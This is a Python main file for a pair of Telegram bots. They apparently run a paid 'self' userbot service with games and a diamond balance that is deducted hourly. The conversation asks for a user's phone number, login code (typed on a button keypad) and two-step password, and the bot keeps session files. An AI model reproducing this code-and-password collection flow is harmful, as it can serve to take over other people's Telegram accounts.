import asyncio
import os
from telegram import (
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    MessageHandler,
    InlineQueryHandler,
    filters,
)

from handlers.rps_game_handler import register_rps_handlers
from config import BOT_TOKEN, PANEL_BOT_TOKEN, supabase
from handlers.client_manager import load_existing_sessions

from handlers.auth_handler import (
    MAIN_MENU, START_PAYMENT, PHONE, CODE, PASSWORD, ENTER_INVITE_CODE,
    start, handle_main_menu_clicks,
    handle_go_to_pay, handle_activation_payment, handle_cancel_to_menu,
    get_phone, handle_code_calculator_clicks, get_password, cancel
)

from handlers.dice_game import (
    game_buttons_callback,
    handle_balance_request,
    handle_transfer_request,
)

from handlers.panel_handler import handle_panel_clicks


# -----------------------------
# INLINE PANEL HANDLER
# -----------------------------
async def inline_panel_handler(update, context):
    try:
        inline_query = update.inline_query
        if not inline_query or inline_query.query != "get_self_panel":
            return

        user_id = inline_query.from_user.id

        keyboard = [
            [
                InlineKeyboardButton("👤 اکانت من", callback_data=f"panel_acc_{user_id}"),
                InlineKeyboardButton("مدیریت", callback_data=f"panel_sett_{user_id}")
            ],
            [
                InlineKeyboardButton("❌ بستن", callback_data=f"panel_close_{user_id}")
            ]
        ]

        results = [
            InlineQueryResultArticle(
                id=f"panel_{user_id}_{update.update_id}",
                title="Panel Management",
                description="Open user panel",
                input_message_content=InputTextMessageContent(
                    "Panel opened. Choose an option:"
                ),
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        ]

        # cache مهم برای جلوگیری از فشار
        await inline_query.answer(results, cache_time=30)

    except Exception as e:
        print(f"[inline_panel_handler error]: {e}")


# -----------------------------
# CONVERSATION HANDLER
# -----------------------------
conv_handler = ConversationHandler(
    entry_points=[
        CommandHandler("start", start),
        MessageHandler(filters.Regex(r"^/start$"), start)
    ],
    states={
        MAIN_MENU: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            CallbackQueryHandler(handle_go_to_pay, pattern="^go_to_pay_\\d+$"),
            CallbackQueryHandler(handle_main_menu_clicks, pattern="^(gold_|menu_|btn_)"),
        ],

        START_PAYMENT: [
            CallbackQueryHandler(handle_activation_payment, pattern="^pay_activation$"),
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
        ],

        PHONE: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(filters.CONTACT, get_phone),
            MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
        ],

        CODE: [
            CallbackQueryHandler(handle_code_calculator_clicks, pattern="^code_"),
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
        ],

        PASSWORD: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(filters.TEXT & ~filters.COMMAND, get_password),
        ],

        ENTER_INVITE_CODE: [
            CallbackQueryHandler(handle_cancel_to_menu, pattern="^cancel_to_menu$"),
            MessageHandler(
                filters.TEXT & ~filters.COMMAND,
                lambda u, c: __import__('handlers.auth_handler',
                fromlist=['process_invite_code_input']
                ).process_invite_code_input(u, c)
            ),
        ],
    },

    fallbacks=[
        CommandHandler("cancel", cancel),
        CommandHandler("start", start)
    ],

    allow_reentry=True,
)


# -----------------------------
# JOB (OPTIMIZED)
# -----------------------------
async def deduct_diamonds_job(context):
    try:
        res = supabase.table("users_diamonds") \
            .select("user_id, diamonds") \
            .eq("is_active", True) \
            .execute()

        if not res.data:
            return

        for user in res.data:
            uid = user["user_id"]

            if uid in (8004897709, 8668275780):
                continue

            new_value = user["diamonds"] - 2

            if new_value > 0:
                supabase.table("users_diamonds") \
                    .update({"diamonds": new_value}) \
                    .eq("user_id", uid) \
                    .execute()
            else:
                supabase.table("users_diamonds") \
                    .update({"diamonds": 0, "is_active": False}) \
                    .eq("user_id", uid) \
                    .execute()

            # جلوگیری از فشار شبکه
            await asyncio.sleep(0.05)

    except Exception as e:
        print(f"[deduct_diamonds_job error]: {e}")


# -----------------------------
# MAIN STARTUP LOOP
# -----------------------------
async def start_dual_bots():
    os.makedirs("new_sessions", exist_ok=True)

    while True:
        main_app = None
        panel_app = None

        try:
            print("🚀 Starting system...")

            # apps
            main_app = Application.builder().token(BOT_TOKEN).build()
            panel_app = Application.builder().token(PANEL_BOT_TOKEN).build()

            # handlers
            main_app.add_handler(conv_handler)
            main_app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^طلا"), handle_balance_request))
            main_app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^واریز طلا \d+$"), handle_transfer_request))

            register_rps_handlers(main_app)
            main_app.add_handler(CallbackQueryHandler(game_buttons_callback, pattern="^game_"))

            # job queue (built-in)
            main_app.job_queue.run_repeating(
                deduct_diamonds_job,
                interval=3600,
                first=60
            )

            # panel bot
            import handlers.panel_handler
            handlers.panel_handler.panel_bot_app = panel_app

            panel_app.add_handler(CallbackQueryHandler(handle_panel_clicks))
            panel_app.add_handler(InlineQueryHandler(inline_panel_handler))

            # sessions
            await load_existing_sessions()

            # init
            await main_app.initialize()
            await panel_app.initialize()

            await main_app.start()
            await panel_app.start()

            await main_app.updater.start_polling(drop_pending_updates=True)
            await panel_app.updater.start_polling(drop_pending_updates=True)

            print("✅ System is running")

            await asyncio.Event().wait()

        except Exception as e:
            print(f"⚠️ Fatal error: {e}")
            print("🔄 Restarting in 10s...")

            try:
                if main_app:
                    await main_app.stop()
                    await main_app.shutdown()
                if panel_app:
                    await panel_app.stop()
                    await panel_app.shutdown()
            except Exception as se:
                print(f"Stop error: {se}")

            await asyncio.sleep(10)


# -----------------------------
# ENTRY POINT
# -----------------------------
if __name__ == "__main__":
    try:
        asyncio.run(start_dual_bots())
    except (KeyboardInterrupt, SystemExit):
        print("🛑 stopped")